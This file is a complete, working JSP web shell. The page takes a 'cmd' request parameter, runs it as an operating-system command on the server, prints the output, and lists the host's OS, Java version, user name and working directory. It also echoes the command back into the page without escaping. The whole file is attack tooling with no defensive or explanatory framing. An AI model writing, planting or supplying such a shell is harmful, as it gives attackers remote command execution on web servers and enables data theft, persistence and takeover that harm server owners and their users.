<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<html>
<head>
    <title>JSP Shell</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        pre { background-color: #f0f0f0; padding: 10px; border-radius: 5px; }
        .command { margin-bottom: 20px; }
        input[type="text"] { width: 80%; padding: 8px; }
        input[type="submit"] { padding: 8px 15px; background-color: #4CAF50; color: white; border: none; }
    </style>
</head>
<body>
    <h2>JSP Web Shell</h2>
    
    <div class="command">
        <form method="GET">
            <input type="text" name="cmd" placeholder="Enter command..." value="<%= request.getParameter("cmd") != null ? request.getParameter("cmd") : "" %>">
            <input type="submit" value="Execute">
        </form>
    </div>
    
    <% if(request.getParameter("cmd") != null) { %>
        <h3>Command Output:</h3>
        <pre>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null && !cmd.isEmpty()) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while(disr != null) {
                out.println(disr);
                disr = dis.readLine();
            }
        } catch(Exception e) {
            out.println("Error executing command: " + e.getMessage());
        }
    }
%>
        </pre>
    <% } %>
    
    <h3>System Information:</h3>
    <pre>
OS: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %> <%= System.getProperty("os.arch") %>
Java: <%= System.getProperty("java.version") %> <%= System.getProperty("java.vendor") %>
User: <%= System.getProperty("user.name") %>
Working Directory: <%= System.getProperty("user.dir") %>
    </pre>
</body>
</html> 